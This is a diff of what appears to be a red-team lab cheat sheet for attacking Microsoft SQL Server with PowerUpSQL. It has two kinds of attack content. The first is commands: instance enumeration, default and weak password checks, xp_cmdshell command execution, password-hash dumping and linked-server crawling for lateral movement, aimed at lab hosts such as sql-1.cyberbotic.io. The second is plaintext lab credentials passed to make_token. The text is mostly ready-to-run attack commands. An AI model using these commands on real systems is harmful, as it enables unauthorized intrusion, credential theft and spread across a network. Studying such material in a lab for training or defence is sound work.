@@ -1,40 +1,43 @@
+### Enumeration 
 ```
-Get-sqlinstancebroadcast -verbose
-Get-sqlinstancebroadcast -verbose | Get-sqlserverlogindefaultpw -verbose
-Get-SQLInstanceDomain -Verbose
-Get-SQLServerInfo -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS
-Get-SQLInstanceLocal -Instance "DESKTOP-4D21EQP\SQLEXPRESS" | Get-SQLServerInfo
-Get-SQLInstanceLocal -Instance "DESKTOP-4D21EQP\SQLEXPRESS" -username 'sa' -password '123456' | Get-SQLServerInfo
+MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
+
+powershell Get-sqlinstancebroadcast -verbose
+powershell Get-sqlinstancebroadcast -verbose | Get-sqlserverlogindefaultpw -verbose
+powershell Get-SQLInstanceDomain -Verbose
+powershell Get-SQLServerInfo -Verbose -Instance sql-1.cyberbotic.io
+powershell Get-SQLServerInfo -Verbose -Instance sql-1.cyberbotic.io | Get-SQLServerInfo
+powershell Get-SQLInstanceLocal -Instance "sql-1.cyberbotic.io" -username 'sa' -password '123456' | Get-SQLServerInfo
+
 ```
 ### Follow out OS Commands
-```
-$Servers = Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 10
-Invoke-SQLAuditWeakLoginPw –Verbose
-Invoke-SQLAuditWeakLoginPw –Verbose –Instance DESKTOP-4D21EQP\SQLEXPRESS –Exploit
-invoke-SQLOSCmd -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS -Command "dir c:\windows\system32\Drivers\etc" -RawResults
-invoke-SQLOSCmd -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS -Command "ipconfig" -RawResults
-Invoke-SQLOSCmd –Verbose –Command “whoami” –Threads 10 -Instance DESKTOP-4D21EQP\SQLEXPRESS
-Get-SQLServerPasswordHash -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS -Migrate
-```
 
-### Linked Server Crawling
 ```
-Get-SQLServerLinkCrawl -verbose -instance "DESKTOP-4D21EQP\SQLEXPRESS" -username 'sa' -password '123456'
-Get-SQLServerLinkCrawl -instance "DESKTOP-4D21EQP\SQLEXPRESS" -Query "exec master..xp_cmdshell ‘whoami’" -username 'sa' -password '123456'
-Get-SQLServerLinkCrawl -instance "DESKTOP-4D21EQP\SQLEXPRESS" -Query "exec master..xp_cmdshell ‘whoami’" -username 'sa' -password '123456'
-```
-```
-make_token dev.zeropointsecurity.co.uk\bridgesb Scorpion!
-make_token cyberbotic.io\svc_mssql Cyberb0tic
+powershell Get-SQLInstanceDomain | Get-SQLConnectionTest
+
 powershell Get-SQLQuery -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version'
-powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\' -RawResults 
-powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\Users\svc_mssql\Desktop' -RawResults 
+powershell Invoke-SQLAuditWeakLoginPw –Verbose
+powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\' -RawResults
 
-powerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433'
-powershell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery
-powershelll Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery | % { $_ | Add-Member NoteProperty 'QueryResult' $($_.CustomQuery[0]); $_ } | f
-111
+powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command "dir c:\windows\system32\Drivers\etc" -RawResults
+
+powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command "ipconfig" -RawResults
+
+powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command "whoami"  –Threads 10
+
 ```
+
+### Lateral Movement
+```
+powershell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433'
+powershell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery
+powershell Get-SQLServerLinkCrawl -verbose -instance "sql-1.cyberbotic.io,1433" -username 'sa' -password '123456'
+powershell Get-SQLServerLinkCrawl -instance "cyberbotic.io" -Query "exec master..xp_cmdshell 'ipconfig'"
+powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\Users\svc_mssql\Desktop' -RawResults 
+powershell Invoke-SQLOSCmd -Instance 'sql02.dev.zeropointsecurity.co.uk,1433' -Command 'dir C:\' -RawResults
+
+```
+
 
 ```
 socks 1080
